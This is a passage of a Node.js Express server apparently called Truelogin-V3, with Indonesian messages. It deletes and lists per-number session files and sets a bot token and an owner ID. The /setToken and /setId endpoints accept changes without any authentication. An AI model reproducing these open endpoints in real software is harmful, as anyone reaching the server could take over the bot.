            txtFiles.forEach(file => {
                const filePath = path.join(dirPath, file);
                fs.unlinkSync(filePath);
            });
            res.json({
                status: "success",
                message: "Semua nomor berhasil dihapus.",
            });
        } else {
            res.json({
                status: "error",
                message: "Tidak ada nomor yang ditemukan untuk dihapus.",
            });
        }
    } catch (error) {
        console.error("Error deleting all numbers:", error);
        res.json({
            status: "error",
            message: "Gagal menghapus nomor.",
        });
    }
});

app.get("/listNumber", async (req, res) => {
    try {
        let files = fs.readdirSync("sessions");
        let numbers = [];
        for (const file of files) {
            if (path.extname(file) === ".txt" && !file.startsWith("pw_")) {
                const isValid = await checkSession(file);
                if (isValid) {
                    numbers.push(path.basename(file, ".txt"));
                }
            }
        }
        res.json({
            status: "success",
            message: "List of active numbers retrieved successfully.",
            numbers: numbers,
        });
    } catch (error) {
        console.error("Error reading session files:", error);
        res.json({
            status: "error",
            message: "Failed to retrieve the list of numbers.",
        });
    }
});

app.post('/setToken', (req, res) => {
  const { token } = req.body;
  if (!token) {
      return res.status(400).json({ status: 'error', message: 'Token tidak diberikan!' });
  }
  if (botToken === token) {
      return res.json({ status: 'success', message: 'Token sudah digunakan, bot tetap berjalan.' });
  }
  botToken = token;
  startBot(botToken);
  res.json({ status: 'success', message: 'Bot token diperbarui dan bot dijalankan ulang!' });
});

app.post('/setId', (req, res) => {
    if (!req.body.userId) {
        return res.status(400).json({ status: 'error', message: 'UserId tidak diberikan!' });
    }
  
    userIdOwner = String(req.body.userId); // ✅ Pastikan bertipe String
  
    res.json({ status: 'success', message: 'Id owner telah disimpan!', userIdOwner });
  });

// Start server
app.listen(port, () => {
  figlet.text('Truelogin-V3', { font: 'Slant' }, (err, data) => {
    console.log(err ? 'Truelogin-V3' : data);
    console.log(`
      By: JieCode
===========================================
Server running on port: ${port}
Environment: ${process.env.NODE_ENV || 'development'}
===========================================
    `);
  });
});

// Error handling
process.on('unhandledRejection', (err) => {
  console.error('Unhandled Rejection:', err);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});
